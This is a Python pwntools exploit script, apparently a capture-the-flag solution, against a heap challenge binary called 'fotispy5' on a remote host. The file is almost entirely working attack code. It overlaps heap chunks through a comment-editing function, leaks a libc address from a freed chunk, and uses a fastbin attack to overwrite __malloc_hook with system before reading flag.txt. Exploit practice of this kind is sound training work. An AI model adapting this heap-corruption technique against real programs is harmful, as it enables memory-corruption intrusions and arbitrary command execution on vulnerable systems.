#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 5195
HOST = "52.59.124.14"
exe = context.binary = ELF('./fotispy5_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            brva 0x0000000000000CD7
            brva 0x0000000000000E08
            brva 0x0000000000000EC5
            brva 0x0000000000000E61
            brva 0x0000000000000F59
            brva 0x00000000000010B8
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def create_user(username, password):
    p.sendlineafter(b'Choice: ', str(1))
    p.sendlineafter(b'Username: ', username)
    p.sendlineafter(b'Password: ', password)

def add_song(size, data=b'abcd'):
    p.sendlineafter(b'Choice: ', str(2))
    p.sendlineafter(b'be: ', str(size))
    p.sendlineafter(b'comment: ', data)

def edit_comment(idx, size, data):
    p.sendlineafter(b'Choice: ', str(3))
    p.sendlineafter(b'select: ', str(idx))
    p.sendlineafter(b'be: ', str(size))
    p.sendlineafter(b'comment: ', data)

def free_song(idx):
    p.sendlineafter(b'Choice: ', str(4))
    p.sendlineafter(b'select: ', str(idx))

def grade_song(idx, choice):
    p.sendlineafter(b'Choice: ', str(5))
    p.sendlineafter(b'select: ', str(idx))
    p.sendlineafter(b'[b]ad: ', choice)

def show(idx):
    p.sendlineafter(b'Choice: ', str(6))
    p.sendlineafter(b'select: ', str(idx))

def edit_stat(idx, choice, size):
    p.sendlineafter(b'Choice: ', str(7))
    p.sendlineafter(b'select: ', str(idx))
    p.sendlineafter(b'Choice: ', choice)
    p.sendlineafter(b'[0-255]: ', str(size))

# VARIABLE


# PAYLOAD
for i in range(3):
    add_song(0x10)
payload = b'\0'*0x13 + p64(0) + p64(0x21)
add_song(0x200, payload) # 3
add_song(0x10) # 4
add_song(0x60) # 5
add_song(0x60) # 6

free_song(3)
show(3)
p.recvuntil(b'You Song has ')
leak1 = int(p.recvuntil(b' likes', drop=True), 10)
p.recvuntil(b'You Song has ')
leak2 = int(p.recvuntil(b' dislikes', drop=True), 10)
p.recvuntil(b'You Song is ')
leak3 = int(p.recvuntil(b' seconds', drop=True), 10)

payload = b''
payload = payload.ljust(0x10, b'\0') + p64(0x210)
payload = payload.ljust(0x1b, b'\0') + p64(0x21)
edit_comment(2, 0x23, payload)

free_song(0)
free_song(1)
payload = p64(0)*2 + p64(0x21) + p8(0x6b)
edit_comment(0, 0x19, payload)

add_song(0x10) # 7
add_song(0x10) # 8
show(8)
p.recvuntil(b'You Song has ')
leak4 = int(p.recvuntil(b' likes', drop=True), 10)
p.recvuntil(b'You Song has ')
leak5 = int(p.recvuntil(b' dislikes', drop=True), 10)
p.recvuntil(b'You Song is ')
leak6 = int(p.recvuntil(b' seconds', drop=True), 10)

leaks = [leak1, leak2, leak3, leak4, leak5, leak6]
libc_leak = int.from_bytes(bytes(leaks), "little")
libc.address = libc_leak - 0x3c4b78
log.info("Libc base: " + hex(libc.address))
malloc_hook = libc.sym.__malloc_hook

free_song(5)
free_song(6)
payload = b'\0'*0x60 + p64(0x71) + p64(malloc_hook - 0x23)
edit_comment(5, 0x70, payload)

add_song(0x60)
add_song(0x60, b'\0'*0xb + p64(libc.sym.system))
p.sendlineafter(b'Choice: ', str(8))
p.sendline(b'cat flag.txt')

p.interactive()